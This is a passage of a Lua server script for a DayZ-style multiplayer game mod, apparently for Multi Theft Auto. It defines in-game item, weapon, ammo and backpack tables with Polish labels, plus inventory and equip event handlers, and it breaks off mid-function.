local h1, h2, h3 = debug.gethook()
debug.sethook()

debug.sethook( _, h1, h2, h3 )

setElementID(resourceRoot,'DayZ_core')

local id_datas = {
	"MoveToEq",
	"Wycraftowano_tralalala",
}

for i,v in pairs(id_datas) do
	setElementData(resourceRoot,v,resourceRoot)
end



local inventoryItems = {
	[1] = {
		{"M4A1-S \n", 0},
		{"M4A1 \n", 0},
		{"G36C \n", 0},
		{"Barrett M107 \n", 0},
		{"SVD Dragunov \n", 0},
		{"AA-12 \n", 0},
		--{"MK 48 Mod 0 \n", 0},
		--{"M60 \n", 0},
		{"PKP Pecheneg \n", 0},
		{"MG-34 \n", 0},
		--{"PKP \n", 0},
		{"AK-47 \n", 0},
		{"Scar-L \n",0},
		{"M16A4 \n", 0},
		--{"SA-58V ACOG \n", 0},
		{"Winchester 1866 \n", 0},
		{"SPAZ-12 Combat Shotgun \n", 0},
		{"Sawn-Off Shotgun \n", 0},
		--{"AKS-74U \n", 0},
		{"Lee Enfield \n", 0},
		--{"DMR \n", 0},
		--{"Cheytac M200 \n", 0},
		{"Scar-L",3},
		--{"AS50 \n", 0},
		{"AWP \n", 0},
		--{"Mosin 9130 \n", 0},
		--{"M24 \n", 0},
		--{"M107 \n", 0},
		--{"SVD Dragunov Camo \n", 0},
		{"M4A1-S", 3},
		{"M4A1", 3},
		{"G36C", 3},
		{"AA-12", 3},
		{"Barrett M107", 4},
		{"SVD Dragunov", 2},
		--{"MK 48 Mod 0", 3},
		--{"M60", 3},
		{"PKP Pecheneg", 3},
		{"MG-34", 3},
		--{"PKP", 3},
		{"AK-47", 3},
		{"M16A4", 3},
		--{"SA-58V ACOG", 3},
		{"Winchester 1866", 3},
		{"SPAZ-12 Combat Shotgun", 3},
		{"Sawn-Off Shotgun", 3},
	--	{"AKS-74U", 3},
		{"Lee Enfield", 3},
		--{"DMR", 3},
		--{"Cheytac M200", 3},
		--{"AS50", 3},
		{"AWP", 3},
		--{"Mosin 9130", 3},
		--{"M24", 3},
		--{"M107", 3},
		--{"SVD Dragunov Camo", 3}
	},
	[2] = {
		{"M1911 \n", 0},
		{"M9 SD \n", 0},
		{"PDW \n", 0},
		{"MP5A5 \n", 0},
		{"Desert Eagle \n", 0},
		{"Hunting Knife \n", 0,_,"Nóż Myśliwski"},
		{"Hatchet \n", 0,_,"Sikierka"},
		{"Baseball Bat \n", 0,_,"Kij Bejzbolowy"},
		{"Shovel \n", 0,_,"Łopata"},
		{"Harvest Scythe \n", 0,_,'Kosa Stacha'},
		{"Chainsaw \n", 0,_,'Piła Mechaniczna'},
		{"Spray \n", 0,_,'Spray'},
		{"M1911", 2},
		{"M9 SD", 2},
		{"PDW", 2},
		{"MP5A5", 2},
		{"Desert Eagle", 2},
		{"Hunting Knife", 1,_,'Nóż Myśliwski'},
		{"Hatchet", 2,_,'Sikierka'},
		{"Parachute \n",0,_,"Spadochron"},
		{'Parachute',1,_,"Spadochron"},
		{"Baseball Bat", 1,_,"Kij Bejzbolowy"},
		{"Shovel", 1,_,"Łopata",},
		{"Harvest Scythe", 1,_,'Kosa Stacha'},
		{"Chainsaw", 2,_,"Piła Mechaniczna"},
		{"Spray", 1,_,"Spray"},
	},
	[3] = {
		{"Flara \n", 0},
		{"Grenade \n", 0,_,"Granat"},
		{"Binoculars \n", 0,_,"Lornetka"},
		{"Flara", 1},
		{"Grenade", 1,_,"Granat"},
		{"Binoculars", 1,_,"Lornetka"}
	},
	[4] = {
		{"M1911 Mag", 0.085},
		{"M9 SD Mag", 0.085},
		{"Desert Eagle Mag", 0.085},
		{"PDW Mag", 0.025},
		{"MP5A5 Mag", 0.025},
		--{"AKS-74U Mag", 0.035},
		{"1866 Slug", 0.067},
		{"2Rnd. Slug", 0.067},
		{"AA-12 Mag", 0.067},
		{"SPAZ-12 Pellet", 0.067},
		{"M4A1-S Mag", 0.035},
		{"G36C Mag", 0.035},
	--	{"MK 48 Mod 0 Mag", 0.035},
		--{"M60 Mag", 0.035},
		{"PKP Pecheneg Mag", 0.035},
		{"MG-34 Mag", 0.035},
	--	{"PKP Mag", 0.035},
		{"AK-47 Mag", 0.035},
		{"Scar-L Mag",0.035},
		{"M16A4 Mag", 0.035},
	--	{"SA-58V ACOG Mag", 0.035},
	--	{"DMR Mag", 0.1},
	--	{"AS50 Mag", 0.1},
		{"AWP Mag", 0.1},
		{"Barrett M107 Mag", 0.1},
		{"SVD Dragunov Mag", 0.1},
	--	{"Mosin 9130 Mag", 0.1},
		--{"M24 Mag", 0.1},
		--{"M107 Mag", 0.1},
		--{"SVD Dragunov Camo Mag", 0.1},
		--{"Cheytac M200 Mag", 0.1},
		{"Lee Enfield Mag", 0.1}
	},
	[5] = {
		{"Water Bottle", 1,_,"Butelka Wody"},
		{"Pasta Can", 1,_,"Makaron"},
		{"Beans Can", 1,_,"Fasolka"},
		{"Kebab",1},
		{"Coca Cola",1},
		{"Burger", 1,_,"Burger"},
		{"Pizza", 1,_,"Pizza"},
		{"Soda Bottle", 1,_,"Napój Gazowany"},
 		{"Milk", 1,_,"Mleko"},
		{"Cooked Meat", 1,_,"Upieczone mięso"}
	},
	[6] = {
		{"Assault Pack (ACU)", 1, "Equip Backpack","Plecak ACU"},
		{"Bag", 2, "Equip Backpack",'Torba'},
		{"Alice Pack", 3, "Equip Backpack",'Plecak Alice'},
		{"Mountain Backpack", 4, "Equip Backpack",'Plecak Górski'},
		{"Czech Backpack", 4, "Equip Backpack","Plecak Czech"},
		{"Coyote Backpack", 4, "Equip Backpack","Plecak Kojot"},
		{"Military Backpack", 5, "Equip Backpack","Plecak Militarny"},
	},
	[7] = {
		{"Camouflage Clothing", 1, "Put clothes on","Przebranie Kamuflujące"},
		{"Civilian Clothing", 1, "Put clothes on","Przebranie Cywila"},
		{"Survivor Clothing", 1, "Put clothes on","Przebranie Ocalałego"},
		{"Ghillie Suit", 1, "Put clothes on","Kombinezon Ghillie"},
		{"Reabel Clothing", 1, "Put clothes on",'Przebranie Rebelianta'},
		{"Woman Clothing", 1, "Put clothes on",'Przebranie Ocalałego [F]'},
		{"Military Clothing [F]",1,"Put clothes on","Przebranie Wojskowe [F]"},
		{"Ghillie Suit [F]",1,"Put clothes on","Kombinezon Ghillie [F]"},
		{"Kombinezon X",1,"Put clothes on","Kombinezon X"},
		{"Diver Suit",1,"Put clothes on","Przebranie nurka"},
		{"Armor",1,"Zaloz Armor","Pancerz"},
	},
	[8] = {
		{"Bush", 1,"Put a bush","Krzak"},
		{"Safe", 3,"Put a safe","Sejf"},
		{"Wood Pile", 2,_,"Stos Drewna"},
		{"Trap",2,'Put a trap',"Pułapka"},
		{"Metal",2},
		{"Lista Metalu",4},
		{"Weapon parts",1},
		{"Bandage", 1, "Bandage yourself","Bandaż"},
		{"Empty Gas Canister", 2,_,"Pusty Karnister"},
		{"Full Gas Canister", 2,_,"Pełny Karnister"},
		{"Medic Kit", 2, "Use","Apteczka Medyczna"},
		{"First Aid Kit",1,"Use","Apteczka Pierwszej Pomocy"},
		{"Medic Bag",3,"Use","Torba Medyczna"},
		--{"Heat Pack", 1, "Use"},
		{"Painkiller", 1, "Use","Środki Przeciwbólowe"},
		{"Morphine", 1, "Use","Morfina"},
		{"Blood Bag", 1,_,"Torebka Krwi"},
		{"Wire Fence", 1, "Build a wire fence","Drut kolczasty"},
		{"Sandbag",2,"Build a sandbag","Worki z Piastkiem"},
		{"Raw Meat", 1,_,"Surowe Mięso"},
		{"Tire", 2,_,"Koło"},
		{"Tank Parts", 2,_,"Zbiornik Paliwa"},
		{"Engine", 5,_,"Silnik"},
		{"Tent", 2, "Pitch a tent","Namiot"},
		{"Medium Tent", 3, "Pitch a tent","Namiot Średni"},
		{"Large Tent", 4, "Pitch a tent","Namiot Duży"},
		{"Empty Water Bottle", 1, "Fill bottle up","Pusta butelka wody"}, 
		{"Empty Soda Cans", 1},
		{"Scruffy Burgers", 1,_,"Spleśniałe burgery"},
		{"Rope",2,'Pull down rope',"Lina"},
		{"Glass",1,_,"Szkło"},
		{"Kontener",10,"Pitch a kontener"},
		{"Bulletproof Glass",2,_,"Szyba Kuloodporna"},
	--	{"Coyote Backpack", 5, "Equip Backpack"},
		--{"CMAR Backpack", 6, "Equip Backpack"},
		--[[{"Kamizelka Taktyczna \n",0,'Dequip Kamizelka'},
		{"Kamizelka Taktyczna",3,"Equip Kamizelka"},]]
	},
	[9] = {
		{"Night Vision Goggles", 0.1,_,"Google Noktowizyjne"},
		{"Infrared Goggles", 0.1,_,"Google Podczerwieni"},
		{"Map", 0.3,_,'Mapa'},
		{"Box of Matches", 0.1, "Make a Fire","Zapałki"},
		{"Watch", 0.1,_,"Zegarek"},
		{"GPS", 0.3},
		{"Toolbox", 0.5,_,"Zestaw Naprawczy"},
		{"Wrench", 1.5,_,"Klucz"},
		{"Code card #1",1,_,"Karta kodowa #1"},
		{"Code card #2",1,_,"Karta kodowa #2"},
		{"Code card #3",1,_,"Karta kodowa #3"},
		{"Code card #4",1,_,"Karta kodowa #4"},
		{"Code card #5",1,_,"Karta kodowa #5"},
		{"Code card #6",1,_,"Karta kodowa #6"},
		--[[{"Small Armybox [D]",0,'Pitch a armybox'},
		{"Small Armybox [B]",0,'Pitch a armybox'},
		{"Spawn [Bobcat] [24H] [D]",0,'Spawn Aut'},
		{"Spawn [Bobcat] [168H] [D]",0,'Spawn Aut'},
		{"Spawn [Bobcat] [168H] [B]",0,'Spawn Aut'},
		{"Spawn [Bobcat] [672H] [B]",0,'Spawn Aut'},
		{"Spawn [Bobcat] [Forever] [B]",0,'Spawn Aut'},
		{"Spawn [Mesa] [24H] [D]",0,'Spawn Aut'},
		{"Spawn [Mesa] [168H] [D]",0,'Spawn Aut'},
		{"Spawn [Mesa] [168H] [B]",0,'Spawn Aut'},
		{"Spawn [Mesa] [672H] [B]",0,'Spawn Aut'},
		{"Spawn [Mesa] [Forever] [B]",0,'Spawn Aut'},
		{"Spawn [Police Maverick] [24H] [D]",0,'Spawn Aut'},
		{"Spawn [Police Maverick] [168H] [D]",0,'Spawn Aut'},
		{"Spawn [Police Maverick] [168H] [B]",0,'Spawn Aut'},
		{"Spawn [Police Maverick] [672H] [B]",0,'Spawn Aut'},
		{"Spawn [Police Maverick] [Forever] [B]",0,'Spawn Aut'},
		{"Spawn [Dodo] [24H] [D]",0,'Spawn Aut'},
		{"Spawn [Dodo] [168H] [B]",0,'Spawn Aut'},
		{"Spawn [Dodo] [672H] [B]",0,'Spawn Aut'},
		{"Spawn [Dodo] [Forever] [B]",0,'Spawn Aut'},
		{"Spawn [Sanchez] [24H] [D]",0,'Spawn Aut'},
		{"Spawn [Sanchez] [168H] [D]",0,'Spawn Aut'},
		{"Spawn [Sanchez] [168H] [B]",0,'Spawn Aut'},
		{"Spawn [Sanchez] [672H] [B]",0,'Spawn Aut'},
		{"Spawn [Sanchez] [Forever] [B]",0,'Spawn Aut'},
		{"Spawn [PCJ-600] [24H] [D]",0,'Spawn Aut'},
		{"Spawn [PCJ-600] [168H] [D]",0,'Spawn Aut'},
		{"Spawn [PCJ-600] [168H] [B]",0,'Spawn Aut'},
		{"Spawn [PCJ-600] [672H] [B]",0,'Spawn Aut'},
		{"Spawn [PCJ-600] [Forever] [B]",0,'Spawn Aut'},
		{"Spawn [FBI-Truck] [24H] [D]",0,'Spawn Aut'},
		{"Spawn [FBI-Truck] [168H] [D]",0,'Spawn Aut'},
		{"Spawn [FBI-Truck] [168H] [B]",0,'Spawn Aut'},
		{"Spawn [FBI-Truck] [672H] [B]",0,'Spawn Aut'},
		{"Spawn [FBI-Truck] [Forever] [B]",0,'Spawn Aut'},
		{"Spawn [S.W.A.T.] [168H] [B]",0,'Spawn Aut'},
		{"Spawn [S.W.A.T.] [672H] [B]",0,'Spawn Aut'},
		{"Spawn [S.W.A.T.] [Forever] [B]",0,'Spawn Aut'},
		{"Spawn [Bullet] [168H] [B]",0,'Spawn Aut'},
		{"Spawn [Bullet] [672H] [B]",0,'Spawn Aut'},
		{"Spawn [Bullet] [Forever] [B]",0,'Spawn Aut'},
		{"Spawn [Sandking] [24H] [D]",0,'Spawn Aut'},
		{"Spawn [Sandking] [168H] [B]",0,'Spawn Aut'},
		{"Spawn [Sandking] [672H] [B]",0,'Spawn Aut'},
		{"Spawn [Sandking] [Forever] [B]",0,'Spawn Aut'},
		{"Spawn [Turismo] [168H] [B]",0,'Spawn Aut'},
		{"Spawn [Turismo] [672H] [B]",0,'Spawn Aut'},
		{"Spawn [Turismo] [Forever] [B]",0,'Spawn Aut'},
		{"Spawn [Comet] [168H] [B]",0,'Spawn Aut'},
		{"Spawn [Comet] [672H] [B]",0,'Spawn Aut'},
		{"Spawn [Comet] [Forever] [B]",0,'Spawn Aut'},
		{"Spawn [Landstalker] [336H] [B]",0,'Spawn Aut'},
		{"Large Armybox [D]",0,"Pitch a Large_armybox"},
		{"Large Armybox [B]",0,"Pitch a Large_armybox"},]]
	}
};

local weaponAmmoTable = {
	["Weapons"] ={
		{"M1911 Mag", "M1911", 22, 346},
		{"M9 SD Mag", "M9 SD", 23, 347},
		{"Desert Eagle Mag", "Desert Eagle", 24, 348},
		{"PDW Mag", "PDW", 28, 352},
		{"MP5A5 Mag", "MP5A5", 29, 353},
		--{"AKS-74U Mag", "AKS-74U", 31, 1839},
		{"AK-47 Mag", "AK-47", 31, 1834},
		{"Scar-L Mag","Scar-L",31,1899},
		--{"M16A4 Mag", "M16A4", 31, 1835},
		{"M4A1-S Mag", "M4A1-S", 31, 1830},
		{"M4A1-S Mag", "M4A1", 31, 1901},
		{"G36C Mag", "G36C", 31, 1831},
		--{"MK 48 Mod 0 Mag", "MK 48 Mod 0", 30, 1880},
		--{"M60 Mag", "M60", 30, 1832},
		{"PKP Pecheneg Mag", "PKP Pecheneg", 30, 1833},
		{"MG-34 Mag", "MG-34", 30, 2070},
		{"SA-58V ACOG Mag", "SA-58V ACOG", 31, 1838},
		{"1866 Slug", "Winchester 1866", 25, 349},
		{"AA-12 Mag", "AA-12", 26, 2056},
		{"2Rnd. Slug", "Sawn-Off Shotgun", 26, 350},
		{"SPAZ-12 Pellet", "SPAZ-12 Combat Shotgun", 27, 351},
		--{"DMR Mag", "DMR", 34, 1869},
		--{"Cheytac M200 Mag", "Cheytac M200", 34, 1870},
		--{"AS50 Mag", "AS50", 34, 1871},
		{"AWP Mag", "AWP", 34, 1872},
		{"SVD Dragunov Mag", "SVD Dragunov", 34, 2054},
		{"Barrett M107 Mag", "Barrett M107", 34, 2055},
		--{"Mosin 9130 Mag", "Mosin 9130", 34, 1873},
		--{"M24 Mag", "M24", 34, 1874},
		--{"M107 Mag", "M107", 34, 1875},
	--	{"SVD Dragunov Camo Mag", "SVD Dragunov Camo", 34, 1876},
		--{"Flara", "Flara \n", 17, 343},
		{"Lee Enfield Mag", "Lee Enfield", 33, 357}
	},
	["others"] = {
		{"Flara", 17, 343, "Flara \n"},
		{"Grenade", 16, 342, "Grenade \n"},
		{"Hunting Knife", 4, 335, "Hunting Knife \n"},
		{"Hatchet", 8, 339, "Hatchet \n"},
		{"Parachute",46,371,"Parachute \n"},
		{"Binoculars", 43, 367, "Binoculars \n"},
		{"Baseball Bat", 5, 336, "Baseball Bat \n"},
		{"Shovel", 6, 337, "Shovel \n"},
		{"Harvest Scythe", 2, 333, "Harvest Scythe \n"},
		{"Chainsaw", 9, 341, "Chainsaw \n"},
		{"Spray", 41, 365, "Spray \n"},
	}
};

function getWeaponAmmoType(name)
	for _,v in ipairs(weaponAmmoTable["Weapons"]) do
		if (name == v[2]) then return v[1], v[3], v[4]; end
	end
	for _,v in ipairs(weaponAmmoTable["others"]) do
		if (name == v[1]) then return v[4], v[2], v[3]; end
	end
	return false, false, false;
end

function getWeaponZombieAmmoType(name)
	for _,v in ipairs(weaponAmmoTable["Weapons"]) do
		if (name == v[2]) then return v[1], v[3], v[4]; end
	end
	return false, false, false;
end

local skinTable = {
	{"Camouflage Clothing", 287},
	{"Civilian Clothing", 288},
	{"Ghillie Suit", 285},
	{"Survivor Clothing", 73},
	{"Woman Clothing", 75},
	{"Reabel Clothing",76},
	{"Ghillie Suit [F]",77},
	{"Military Clothing [F]",78},
	{"Kombinezon X",235},
	{"Diver Suit",236},
};

local language = {
	['PL'] = {
		['Zjadles'] = "Skonsumowaleś ",
	},
	['ENG'] = {
		['Zjadles'] = "You consumed ",
	},
}

local exported_przedmioty = {}

function convertItemTableitems()
	for k,_ in pairs(inventoryItems) do
		for i,v in pairs(inventoryItems[k]) do
			table.insert(exported_przedmioty,v)
		end
	end
end
convertItemTableitems()


function getItemTable()
	return exported_przedmioty
end


local weatherTable = {
	[1] = 5,
	[2] = 8,
	[3] = 7,
	[4] = 10
};

local backpackSlots = {
	["NTS"] = {
		["Assault Pack (ACU)"] = 14,
		["Bag"] = 20,
		["Alice Pack"] = 32,
		["Mountain Backpack"] = 42,
		["Czech Backpack"] = 52,
		["Coyote Backpack"] = 62,
		["Military Backpack"] = 72,
		["CMAR Backpack"] = 92
	},
	["STN"] = {
		[14]="Assault Pack (ACU)",
		[20]="Bag",
		[32]="Alice Pack",
		[42]="Mountain Backpack",
		[52]="Czech Backpack",
		[62]="Coyote Backpack",
		[72]="Military Backpack",
		[92]="CMAR Backpack",  
	}
};

local elementBackpack = {};
local elementWeaponBack = {};
local elementWeaponBack2 = {};
local elementWeaponRaplace = {};
local handsUp = false;
local siting = false;
local lying = false;


local xml = xmlLoadFile("Sandbagi.xml")
if not xml then
	xml = xmlCreateFile("Sandbagi.xml","Sandbagi")
	xmlNodeSetAttribute(xml,"Last_ID",1)
	xmlSaveFile(xml)
end

local xml_save_dane = {
	{"id"},
	{"pozycja"},
	{"rotacja"},
}

function addToXML(dane)
	local child = xmlCreateChild(xml,"Sandbagi")
	for i,v in pairs(xml_save_dane) do
		xmlNodeSetAttribute(child,v[1],dane[v[1]])
	end
	xmlSaveFile(xml)
end

function xmlGetLastID()
	local child = xmlNodeGetAttribute(xml,"Last_ID")
	return child
end

function xmlAddLastID()
	local child = xmlNodeGetAttribute(xml,"Last_ID")
	xmlNodeSetAttribute(xml,"Last_ID",tonumber(child) + 1)
	xmlSaveFile(xml)
end

function deleteFromXML(search_id)
	--outputChatBox(search_id)
	local child = xmlNodeGetChildren(xml)
	for i,v in pairs(child) do
		local idd = xmlNodeGetAttribute(v,"id")
		if tonumber(idd) == tonumber(search_id) then
			xmlDestroyNode(v)
		end
	end
	xmlSaveFile(xml)
end


local weaponToSlot = {
	{"M4A1-S \n", 1, "M4A1-S"},
	{"M4A1 \n", 1, "M4A1"},
	{"G36C \n", 1, "G36C"},
	{"MK 48 Mod 0 \n", 1, "MK 48 Mod 0"},
	{"M60 \n", 1, "M60"},
	{"PKP Pecheneg \n", 1, "PKP Pecheneg"},
	{"MG-34 \n", 1, "MG-34"},
	{"AK-47 \n", 1, "AK-47"},
	{"Scar-L \n",1,"Scar-L"},
	{"M16A4 \n", 1, "M16A4"},
	{"SA-58V ACOG \n", 1, "SA-58V ACOG"},
	{"Winchester 1866 \n", 1, "Winchester 1866"},
	{"AA-12 \n", 1, "AA-12"},
	{"SPAZ-12 Combat Shotgun \n", 1, "SPAZ-12 Combat Shotgun"},
	{"Sawn-Off Shotgun \n", 1, "Sawn-Off Shotgun"},
	{"AKS-74U \n", 1, "AKS-74U"},
	{"Lee Enfield \n", 1, "Lee Enfield"},
	{"DMR \n", 1, "DMR"},
	{"Cheytac M200 \n", 1, "Cheytac M200"},
	{"AS50 \n", 1, "AS50"},
	{"AWP \n", 1, "AWP"},
	{"Barrett M107 \n", 1, "Barrett M107"},
	{"SVD Dragunov \n", 1, "SVD Dragunov"},
	{"Mosin 9130 \n", 1, "Mosin 9130"},
	{"M24 \n", 1, "M24"},
	{"M107 \n", 1, "M107"},
	{"SVD Dragunov Camo \n", 1, "SVD Dragunov Camo"},
	{"M1911 \n", 2, "M1911"},
	{"M9 SD \n", 2, "M9 SD"},
	{"PDW \n", 2, "PDW"},
	{"MP5A5 \n", 2, "MP5A5"},
	{"Desert Eagle \n", 2, "Desert Eagle"},
	{"Hunting Knife \n", 2, "Hunting Knife"},
	{"Hatchet \n", 2, "Hatchet"},
	{"Parachute \n",2,"Parachute"},
	{"Baseball Bat \n", 2, "Baseball Bat"},
	{"Shovel \n", 2, "Shovel"},
	{"Harvest Scythe \n", 2, "Harvest Scythe"},
	{"Chainsaw \n", 2, "Chainsaw"},
	{"Spray \n", 2, "Spray"},
	{"Flara \n", 3, "Flara"},
	{"Grenade \n", 3, "Grenade"},
	{"Binoculars \n", 3, "Binoculars"}
};

function getEquippedWeaponSlot(weapon)
	for _,v in ipairs(weaponToSlot) do
		if (v[1] == weapon) then return v[2]; end
	end
end

function getEquippedWeaponName(weapon)
	for _,v in ipairs(weaponToSlot) do
		if (v[1] == weapon) then return v[3]; end
	end
end

function loadSandbags()
	local child = xmlNodeGetChildren(xml)
	for i,v in pairs(child) do
		local id = xmlNodeGetAttribute(v,"id")
		local pozycja = fromJSON(xmlNodeGetAttribute(v,"pozycja"))
		local rotacja = fromJSON(xmlNodeGetAttribute(v,"rotacja"))
		local object = createObject(14843,pozycja[1],pozycja[2],pozycja[3],rotacja[1],rotacja[2],rotacja[3])
		local col = createColSphere(pozycja[1], pozycja[2], pozycja[3], 1.5);
		attachElements(col, object, 0, 0, 0);
		setElementData(object,"Sandbag:ID",id)
		setElementData(col, "parent", object);
		setElementData(object, "parent", col);
		setElementData(col, "sandbag", true);
	end
end
loadSandbags()


addEvent("relWep", true);
addEvent("createDeadAnimal", true);
addEvent("onPlayerHideBody", true);
addEvent("onPlayerRearmWeapon", true);
addEvent("removeBackWeaponOnDrop", true);
addEvent("kilLDayZPlayer", true);
addEvent("onPlayerRequestChangingStats", true);
addEvent("onPlayerUseMedicObject", true);
addEvent("onPlayerGiveMedicObject", true);
addEvent("onPlayerChangeSkin", true);
addEvent("onPlayerRefillWaterBottle", true);
addEvent("onPlayerPitchATent", true);
addEvent("onPlayerBuildAWireFence", true);
addEvent("removeWirefence", true);
addEvent("addPlayerCookMeat", true);
addEvent("removeTent" ,true);
addEvent("onPlayerMakeAFire", true);
addEvent("onPlayerPlaceRoadflare", true);
addEvent("kickPlayerOnHighPing", true);
addEvent("onPlayerEquipBackpack", true);
addEvent("onPlayerUnequipWeapon", true);


function getBackpackNameFromSlots(slots)
	if (slots > 8) then
		return backpackSlots["STN"][slots];
	end
	return "None";
end

function getBackpackSlotsFromName(name)
	if name then
		return backpackSlots["NTS"][name];
	end
	return false;
end

addEvent('DajDzwiekZabicia',true)
addEventHandler("DajDzwiekZabicia",resourceRoot,function(player)
	if not isElement(player) then return end
	triggerClientEvent(player,'Zagrajze_dead',player)
end)

function removeBackpack(source)
	if elementBackpack[source]  then
		exports['bone_attach']:detachElementFromBone(elementBackpack[source]);
		destroyElement(elementBackpack[source]);
		elementBackpack[source] = false;
		setElementData(source, "tohide2", "NONE");
	end
end

function removeWeaponBack(source)
	if elementWeaponBack[source] then
		exports['bone_attach']:detachElementFromBone(elementWeaponBack[source]);
		destroyElement(elementWeaponBack[source]);
		elementWeaponBack[source] = false;
		setElementData(source, "tohide3", "NONE");
	end
end

function removeWeaponBack2(source)
	if elementWeaponBack2[source] then
		exports['bone_attach']:detachElementFromBone(elementWeaponBack2[source]);
		destroyElement(elementWeaponBack2[source]);
		elementWeaponBack2[source] = false;
		setElementData(source, "tohide4", "NONE");
	end
end

function removeWeaponReplace(source)
	if elementWeaponRaplace[source] then
		exports['bone_attach']:detachElementFromBone(elementWeaponRaplace[source]);
		destroyElement(elementWeaponRaplace[source]);
		elementWeaponRaplace[source] = false;
		setElementData(source, "tohide1", "NONE");
	end
end

function getElementCurrentSlots(element)
	local current_SLOTS = 0;
	for _,k in pairs({1,2,3,4,5,6,7,8,9}) do
		for _,v in ipairs(inventoryItems[k]) do
			local data = getElementData(element, v[1]);
			if (data and data >= 1) then
				current_SLOTS = current_SLOTS+v[2]*data;
			end
		end
	end
	return tonumber(string.format("%.0f",tostring(current_SLOTS)))
end

addEventHandler("onPlayerEquipBackpack", root, function(backpack)
	local nSlots = getBackpackSlotsFromName(tostring(backpack));
	local oSlots = getElementData(source, "MAX_Slots");
	local data = 0
	if (nSlots+data > oSlots) then
		setElementData(source, "MAX_Slots", nSlots+data);
		setElementData(source, backpack, getElementData(source, backpack) - 1);
		local oName = getBackpackNameFromSlots(oSlots-data);
		if oName then
		setElementData(source, oName, (getElementData(source, oName) or 0) + 1);
		end
		triggerClientEvent(source, "refreshInventoryManual", source);
		triggerClientEvent(source,'PlaySoundItem',source,'Pack')
	elseif nSlots==oSlots then
		exports.DayZ_notification:DrawNotification("Ten plecak jest taki sam!", 255, 255, 255, source);
	else
	 if nSlots+data >= getElementCurrentSlots(source) then 
		
		setElementData(source, "MAX_Slots", nSlots+data);
		setElementData(source, backpack, getElementData(source, backpack) - 1);
		local oName = getBackpackNameFromSlots(oSlots-data);
		setElementData(source, oName, (getElementData(source, oName) or 0) + 1);
		triggerClientEvent(source, "refreshInventoryManual", source);
		triggerClientEvent(source,'PlaySoundItem',source,'Pack')
	 else
	 exports.DayZ_notification:DrawNotification("Ten plecak jest za mały!", 255, 255, 255, source);
	 end
	end
end);

addEvent('onPlayerEquipBackpack_FromLoot',true)
addEventHandler("onPlayerEquipBackpack_FromLoot", root, function(backpack,loot)
	if not loot then return end
	local nSlots = getBackpackSlotsFromName(tostring(backpack));
	local oSlots = getElementData(source, "MAX_Slots");
	if (nSlots > oSlots) then
	setElementData(source, "MAX_Slots", nSlots);
		setElementData(loot, backpack, getElementData(loot, backpack) - 1);
		local oName = getBackpackNameFromSlots(oSlots);
		if oName then
		setElementData(loot, oName, (getElementData(loot, oName) or 0) + 1);
		end
		triggerClientEvent(source,'refreshLootManual',source,loot)
		triggerClientEvent(source, "refreshInventoryManual", source);
		triggerClientEvent(source,'PlaySoundItem',source,'Pack')
	end
end);

addEventHandler("onPlayerUnequipWeapon", root, function(eweapon, slot)
	local weap = getElementData(source, "currentweapon_"..tostring(slot));
	local name,id,model = getWeaponAmmoType(weap);
	if not id then return end
	takeWeapon(source, id);
	if (slot < 3) then
		setElementData(source, weap, getElementData(source, weap) + 1);
		setElementData(source, eweapon, getElementData(source, eweapon) - 1);
		setElementData(source, "currentweapon_"..tostring(slot), "");
		if (slot == 1) then
			removeWeaponBack(source);
			removeWeaponReplace(source);
		else
			removeWeaponBack2(source);
		end
	else
		setElementData(source, weap, getElementData(source, weap.." \n"));
		setElementData(source, eweapon, 0);
		setElementData(source, "currentweapon_"..tostring(slot), "");
	end
	triggerClientEvent(source, "refreshInventoryManual", source);
end);

addEventHandler("onPlayerRearmWeapon", root, function(weapon, slot)
	if (getElementData(source,weapon) or 0 ) <= 0 then return end
	takeAllWeapons(source);
	local wAmmo,id,_ = getWeaponAmmoType(weapon);
	local ammos = wAmmo;
	if (id ~= 8 or id ~= 5 or id ~= 6 or id ~= 2) then
		ammos = 1;
	end
	--if (getElementData(source,weapon) or 0) <= 0 then return end
	if (slot < 3 and ammos < 1) then
		exports.DayZ_notification:DrawNotification("Nie masz ammunicji do tej broni!!", 255, 255, 255, source);
	else
		local old = getElementData(source, "currentweapon_"..tostring(slot));
	--	outputChatBox(old,root)
		if (weapon == old) then
			equipThem(source, slot);
			return;
		end
		if (slot < 3) then
			if (old ~= "") then
			--outputChatBox("dostajem bron",root)
				setElementData(source, old, getElementData(source, old) + 1);
				setElementData(source, old.." \n", 0);
			end
			setElementData(source, weapon, getElementData(source, weapon) - 1);
			setElementData(source, weapon.." \n", 1);
			setElementData(source, "currentweapon_"..tostring(slot), weapon);
		else
			if (old ~= "") then
				local oldq = getElementData(source, old);
				if (oldq > 0) then
					setElementData(source, old, oldq);
				end
			end
			setElementData(source, weapon.." \n", getElementData(source, weapon));
			setElementData(source, "currentweapon_"..tostring(slot), weapon);
			setElementData(source, weapon, 0);
		end
	end
	triggerClientEvent(source, "refreshInventoryManual", source);
	equipThem(source, slot);
end);

--[[
setElementData(source,itemName,getElementData(source,itemName)-1)
setElementData(source,itemName,

]]
addEvent('onPlayerEquipKamizelka',true)
addEventHandler('onPlayerEquipKamizelka',root,function(itemName)
if not itemName:find('Kamizelka') then return end
	if getElementData(source,itemName..' \n')>=1 then
		setElementData(source,itemName..' \n',0)
		setElementData(source,itemName,getElementData(source,itemName)+1)
	end
	setElementData(source,itemName..' \n',1)
	setElementData(source,itemName,getElementData(source,itemName)-1)
	triggerClientEvent(source, "refreshInventoryManual", source);
end)

addEvent('onPlayerDequipKamizelka',true)
addEventHandler('onPlayerDequipKamizelka',root,function(itemName)
	setElementData(source,itemName,0)
	local item = itemName:gsub(' \n','')
	setElementData(source,item,getElementData(source,item)+1)
	triggerClientEvent(source, "refreshInventoryManual", source);
end)

local player_shoot = {}

addEventHandler("onPlayerWeaponFire", root, function(weapon)
	if weapon == 41 then return end
	player_shoot[source] = true
	local slot = getSlotFromWeapon(weapon);
	if (slot == 3 or slot == 5 or slot == 6 or slot == 7) then
		local ammo,_ = getWeaponAmmoType(getElementData(source, "currentweapon_1"));
		if not ammo then return end
		if (getElementData(source, ammo) or 0) > 0 then
			setElementData(source, ammo, getElementData(source, ammo) - 1);
		end
	elseif (slot == 2 or slot == 4) then
		local ammo,_ = getWeaponAmmoType(getElementData(source, "currentweapon_2"));
		if (getElementData(source, ammo) or 0) > 0 then
			setElementData(source, ammo, getElementData(source, ammo) - 1);
		end
	else
		local weap = getElementData(source, "currentweapon_3");
		if (weap == "Grenade" or weap == "Flara") then
			weap = weap.." \n";
		end
		local ammo,_ = getWeaponAmmoType(weap);
		if (getElementData(source, ammo) or 0) > 0 then
			setElementData(source, ammo, getElementData(source, ammo) - 1);
